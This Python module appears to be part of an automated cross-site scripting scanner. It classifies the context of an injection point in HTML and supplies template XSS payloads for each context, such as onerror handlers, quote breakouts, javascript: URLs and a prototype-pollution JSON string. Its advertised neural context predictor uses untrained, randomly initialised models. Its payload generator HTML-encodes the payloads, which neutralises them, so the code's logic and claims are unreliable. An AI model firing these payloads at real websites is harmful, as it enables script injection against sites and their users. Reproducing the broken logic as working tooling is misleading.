"""
Context-Aware Payload Synthesis using Deep Learning
Predicts injection context and generates optimized payloads
"""

import re
import json
from typing import List, Dict, Tuple, Optional
from dataclasses import dataclass

# Optional dependencies
try:
    import torch
    import torch.nn as nn
    TORCH_AVAILABLE = True
except ImportError:
    TORCH_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False


@dataclass
class InjectionContext:
    """Represents detailed injection context"""
    context_type: str  # html, javascript, attribute, url, json, etc.
    surrounding_code: str
    filters_detected: List[str]
    encoding_required: List[str]
    tag_context: Optional[str] = None
    attribute_context: Optional[str] = None
    quote_char: Optional[str] = None
    confidence: float = 0.0


if TORCH_AVAILABLE:
    class ContextEmbedder(nn.Module):
        """Neural network for embedding HTML/JS context into vector space"""
        
        def __init__(self, vocab_size=5000, embedding_dim=128, hidden_dim=256):
            super(ContextEmbedder, self).__init__()
            
            self.embedding = nn.Embedding(vocab_size, embedding_dim)
            self.lstm = nn.LSTM(embedding_dim, hidden_dim, num_layers=2, 
                               batch_first=True, bidirectional=True)
            self.attention = nn.MultiheadAttention(hidden_dim * 2, num_heads=4)
            self.fc = nn.Linear(hidden_dim * 2, 64)
        
        def forward(self, x):
            embedded = self.embedding(x)
            lstm_out, _ = self.lstm(embedded)
            attended, _ = self.attention(lstm_out, lstm_out, lstm_out)
            pooled = torch.mean(attended, dim=1)
            output = self.fc(pooled)
            return output
    
    class ContextClassifier(nn.Module):
        """Classifies injection context type"""
        
        def __init__(self, input_dim=64, num_classes=15):
            super(ContextClassifier, self).__init__()
            
            self.classifier = nn.Sequential(
                nn.Linear(input_dim, 128),
                nn.ReLU(),
                nn.Dropout(0.3),
                nn.Linear(128, 64),
                nn.ReLU(),
                nn.Dropout(0.2),
                nn.Linear(64, num_classes),
                nn.Softmax(dim=1)
            )
        
        def forward(self, x):
            return self.classifier(x)


class ContextPredictor:
    """
    Deep learning-based context prediction and payload synthesis
    Falls back to rule-based analysis if PyTorch not available
    """
    
    def __init__(self, model_path: Optional[str] = None, device='cpu'):
        self.device = torch.device(device if (TORCH_AVAILABLE and torch.cuda.is_available()) else 'cpu')
        
        # Context types
        self.context_types = [
            'html_body',
            'html_attribute',
            'javascript_string',
            'javascript_code',
            'url_parameter',
            'json_value',
            'css_value',
            'html_comment',
            'script_tag',
            'event_handler',
            'dom_property',
            'template_literal',
            'svg_context',
            'xml_context',
            'unknown'
        ]
        
        # Initialize models if PyTorch available
        if TORCH_AVAILABLE:
            self.embedder = ContextEmbedder().to(self.device)
            self.classifier = ContextClassifier(num_classes=len(self.context_types)).to(self.device)
            self.vocab = self._build_vocabulary()
            self.char_to_idx = {char: idx for idx, char in enumerate(self.vocab)}
            self.idx_to_char = {idx: char for idx, char in enumerate(self.vocab)}
        else:
            self.embedder = None
            self.classifier = None
            print("[WARN] PyTorch not available. Using rule-based context prediction.")
        
        # Payload templates for each context
        self.payload_templates = self._load_payload_templates()
        
        print(f"[CONTEXT] Context Predictor initialized")
        print(f"   Device: {self.device if TORCH_AVAILABLE else 'N/A'}")
        print(f"   Context types: {len(self.context_types)}")
    
    def _build_vocabulary(self) -> List[str]:
        """Build character vocabulary"""
        vocab = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
        vocab += list(" !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~\n\t")
        vocab.append('<PAD>')
        vocab.append('<UNK>')
        return vocab
    
    def _load_payload_templates(self) -> Dict[str, List[str]]:
        """Load payload templates for each context type"""
        return {
            'html_body': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<iframe srcdoc="<script>alert(1)</script>">',
            ],
            'html_attribute': [
                '" onload=alert(1) x="',
                "' onerror=alert(1) x='",
                '"><script>alert(1)</script><x x="',
            ],
            'javascript_string': [
                "';alert(1)//",
                '";alert(1)//',
                '`;alert(1)//',
            ],
            'javascript_code': [
                'alert(1)',
                'eval("alert(1)")',
                'Function("alert(1)")()',
            ],
            'url_parameter': [
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
            ],
            'json_value': [
                '{"__proto__":{"toString":"alert(1)"}}',
                '"}};alert(1);//',
            ],
            'event_handler': [
                'alert(1)',
                'javascript:alert(1)',
            ],
            'svg_context': [
                '<script>alert(1)</script>',
                '<set attributeName=onload to=alert(1)>',
            ],
        }
    
    def predict_context(self, html_snippet: str, injection_point: Dict) -> Dict:
        """
        Predict the injection context
        
        Args:
            html_snippet: HTML response containing injection point
            injection_point: Injection point information
        
        Returns:
            Context prediction with suggested payloads
        """
        # Use neural network if available, otherwise use rule-based
        if TORCH_AVAILABLE and self.embedder and self.classifier:
            return self._neural_predict(html_snippet, injection_point)
        else:
            return self._rule_based_predict(html_snippet, injection_point)
    
    def _neural_predict(self, html_snippet: str, injection_point: Dict) -> Dict:
        """Neural network-based context prediction"""
        # Tokenize context
        context_str = html_snippet[:200]
        tokens = [self.char_to_idx.get(c, self.char_to_idx['<UNK>']) for c in context_str]
        
        # Pad
        if len(tokens) < 200:
            tokens += [self.char_to_idx['<PAD>']] * (200 - len(tokens))
        
        # Convert to tensor
        tokens_tensor = torch.tensor([tokens], dtype=torch.long).to(self.device)
        
        # Predict
        with torch.no_grad():
            embedding = self.embedder(tokens_tensor)
            probs = self.classifier(embedding)
            context_idx = torch.argmax(probs, dim=1).item()
            confidence = probs[0, context_idx].item()
        
        context_type = self.context_types[context_idx]
        
        return {
            'context_type': context_type,
            'confidence': confidence,
            'encoding_required': self._determine_encodings(context_type),
            'suggested_payloads': self.payload_templates.get(context_type, ['<script>alert(1)</script>'])
        }
    
    def _rule_based_predict(self, html_snippet: str, injection_point: Dict) -> Dict:
        """Rule-based context prediction (fallback)"""
        context_type = 'html_body'
        confidence = 0.7
        
        # Check for JavaScript context
        if '<script' in html_snippet.lower():
            if '"' in html_snippet or "'" in html_snippet:
                context_type = 'javascript_string'
                confidence = 0.85
            else:
                context_type = 'javascript_code'
                confidence = 0.85
        
        # Check for HTML attribute
        if '=' in html_snippet and ('"' in html_snippet or "'" in html_snippet):
            context_type = 'html_attribute'
            confidence = 0.8
        
        # Check for event handler
        if any(event in html_snippet.lower() for event in ['onclick=', 'onload=', 'onerror=']):
            context_type = 'event_handler'
            confidence = 0.9
        
        # Check for URL parameter
        if '?' in html_snippet or '&' in html_snippet:
            context_type = 'url_parameter'
            confidence = 0.75
        
        # Check for JSON
        try:
            json.loads(html_snippet)
            context_type = 'json_value'
            confidence = 0.8
        except:
            pass
        
        return {
            'context_type': context_type,
            'confidence': confidence,
            'encoding_required': self._determine_encodings(context_type),
            'suggested_payloads': self.payload_templates.get(context_type, ['<script>alert(1)</script>'])
        }
    
    def _determine_encodings(self, context_type: str) -> List[str]:
        """Determine required encodings for context"""
        encoding_map = {
            'html_body': ['html'],
            'html_attribute': ['html', 'url'],
            'javascript_string': ['javascript'],
            'javascript_code': [],
            'url_parameter': ['url'],
            'json_value': ['json'],
            'css_value': ['css'],
            'event_handler': ['html'],
        }
        return encoding_map.get(context_type, ['html', 'url'])
    
    def analyze_context(self, html_response: str, injection_marker: str) -> InjectionContext:
        """
        Analyze injection context using deep learning or rules
        
        Args:
            html_response: HTML response containing injected marker
            injection_marker: The marker injected (e.g., "XSS_TEST_123")
        
        Returns:
            InjectionContext object with detailed analysis
        """
        print(f"[CONTEXT] Analyzing injection context...")
        
        # Find injection location
        marker_pos = html_response.find(injection_marker)
        if marker_pos == -1:
            return InjectionContext(
                context_type='unknown',
                surrounding_code='',
                filters_detected=[],
                encoding_required=[],
                confidence=0.0
            )
        
        # Extract surrounding context
        context_start = max(0, marker_pos - 100)
        context_end = min(len(html_response), marker_pos + len(injection_marker) + 100)
        surrounding_code = html_response[context_start:context_end]
        
        # Feature extraction
        features = self._extract_context_features(html_response, marker_pos, injection_marker)
        
        # Predict context
        prediction = self.predict_context(surrounding_code, {})
        
        # Detect filters
        filters = self._detect_filters(html_response, injection_marker)
        
        # Determine required encodings
        encodings = prediction['encoding_required']
        
        context = InjectionContext(
            context_type=prediction['context_type'],
            surrounding_code=surrounding_code,
            filters_detected=filters,
            encoding_required=encodings,
            tag_context=features.get('tag_context'),
            attribute_context=features.get('attribute_context'),
            quote_char=features.get('quote_char'),
            confidence=prediction['confidence']
        )
        
        print(f"[CONTEXT] Context: {context.context_type} (confidence: {context.confidence:.2f})")
        print(f"   Filters: {filters}")
        print(f"   Encodings needed: {encodings}")
        
        return context
    
    def _extract_context_features(self, html: str, marker_pos: int, marker: str) -> Dict:
        """Extract rule-based context features"""
        features = {}
        
        before = html[:marker_pos]
        after = html[marker_pos + len(marker):]
        
        # Check if inside HTML tag
        last_open = before.rfind('<')
        next_close = after.find('>')
        
        if last_open != -1 and next_close != -1:
            tag_content = before[last_open:] + marker + after[:next_close]
            
            # Extract tag name
            tag_match = re.match(r'<(\w+)', tag_content)
            if tag_match:
                features['tag_context'] = tag_match.group(1)
            
            # Check if in attribute
            if '=' in tag_content:
                attr_match = re.search(r'(\w+)\s*=\s*["\']?[^"\']*' + re.escape(marker), tag_content)
                if attr_match:
                    features['attribute_context'] = attr_match.group(1)
                
                # Detect quote character
                if '"' + marker in tag_content or marker + '"' in tag_content:
                    features['quote_char'] = '"'
                elif "'" + marker in tag_content or marker + "'" in tag_content:
                    features['quote_char'] = "'"
        
        return features
    
    def _detect_filters(self, html: str, marker: str) -> List[str]:
        """Detect active filters/sanitization"""
        filters = []
        
        # Check if marker was modified
        if marker not in html:
            filters.append('input_sanitization')
        
        # Check for encoding
        if '&lt;' in html or '&gt;' in html:
            filters.append('html_encoding')
        
        # Check for script tag blocking
        if '<script' in html.lower() and marker.lower() in html.lower():
            # Check if script tag was removed
            if html.count('<script') != html.count('</script>'):
                filters.append('script_tag_filtering')
        
        return filters
    
    def generate_context_payloads(self, context: InjectionContext, count: int = 5) -> List[str]:
        """Generate context-aware payloads"""
        templates = self.payload_templates.get(context.context_type, ['<script>alert(1)</script>'])
        
        # Apply encodings
        payloads = []
        for template in templates[:count]:
            payload = template
            for encoding in context.encoding_required:
                if encoding == 'html':
                    payload = payload.replace('<', '&lt;').replace('>', '&gt;')
                elif encoding == 'url':
                    from urllib.parse import quote
                    payload = quote(payload)
            payloads.append(payload)
        
        return payloads


# ==================== USAGE EXAMPLE ====================

if __name__ == "__main__":
    predictor = ContextPredictor()
    
    # Analyze context
    html = '<div class="search"><input value="XSS_TEST_123"></div>'
    context = predictor.analyze_context(html, "XSS_TEST_123")
    
    print(f"\n[CONTEXT] Analysis Results:")
    print(f"  Context Type: {context.context_type}")
    print(f"  Confidence: {context.confidence:.2f}")
    print(f"  Filters: {context.filters_detected}")
    print(f"  Encodings: {context.encoding_required}")
    
    # Generate payloads
    payloads = predictor.generate_context_payloads(context)
    print(f"\n[CONTEXT] Suggested Payloads:")
    for i, payload in enumerate(payloads, 1):
        print(f"  {i}. {payload}")
